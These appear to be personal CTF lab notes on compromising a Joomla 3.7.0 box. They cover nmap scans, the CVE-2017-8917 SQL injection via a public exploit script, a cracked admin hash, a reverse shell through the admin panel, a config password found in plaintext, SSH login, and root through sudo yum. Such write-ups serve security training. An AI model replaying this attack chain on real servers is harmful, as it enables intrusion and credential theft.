my IP = 10.10.35.114
victim IP = 10.10.118.65

# Namp scan

`nmap -A 10.10.118.65`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (EdDSA)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home


```

PORT 22 => SSH
PORT 80 => HTTP

`nmap -sV --script vuln 10.10.118.65`

```
| http-enum: 
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /robots.txt: Robots file
|   /language/en-GB/en-GB.xml: Joomla! 
|   /htaccess.txt: Joomla!
|   /README.txt: Interesting, a readme.
|   /bin/: Potentially interesting folder
|   /cache/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /images/: Potentially interesting folder
|   /includes/: Potentially interesting folder
|   /libraries/: Potentially interesting folder
|   /modules/: Potentially interesting folder
|   /templates/: Potentially interesting folder
|_  /tmp/: Potentially interesting folder

| http-vuln-cve2017-8917: 
|   VULNERABLE:
|   Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-8917
|     Risk factor: High  CVSSv3: 9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
|       An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
|       to execute aribitrary SQL commands via unspecified vectors.
|       
|     Disclosure date: 2017-05-17
|     Extra information:
|       User: root@localhost
|     References:
|       https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8917

3306/tcp open  mysql   MariaDB (unauthorized)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)

```

# Exploit

So there is SQL Injection in Joomla 3.7.0.
To use it we use `git clone "https://github.com/stefanlucas/Exploit-Joomla.git"`

Run `python3 joomblah.py http://10.10.118.65/`

![[Pasted image 20231011094903.png]]

We have:

```
user: jonah
hashed password : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

Retrive the passeord using `https://hashes.com/en/tools/hash_identifier`:

```
user: jonah
password : spiderman123
```

Let's start a gobuster search:

![[Pasted image 20231011095909.png]]

> We found the directory `/administrator`

Using the credentials to access in website: `http://10.10.118.65/administrator/`

![[Pasted image 20231011100007.png]]

Using `https://www.hackingarticles.in/joomla-reverse-shell/`

![[Pasted image 20231011100658.png]]

We got access.

Try to enumerate the machine using `linpeas.sh`

![[Pasted image 20231011101124.png]]

The results are:
```
[+] Searching passwords in config PHP files
	public $password = 'nv5uz9r3ZEDzVjNu';
```

Search for user in this machine:

![[Pasted image 20231011103444.png]]

There is jjamenson user. SSH it:

![[Pasted image 20231011103418.png]]

Try to privilege escalation --> use `sudo -l`

![[Pasted image 20231011103545.png]]

Search on https://gtfobins.github.io/gtfobins/yum/ and we have a root shell.

![[Pasted image 20231011103630.png]]




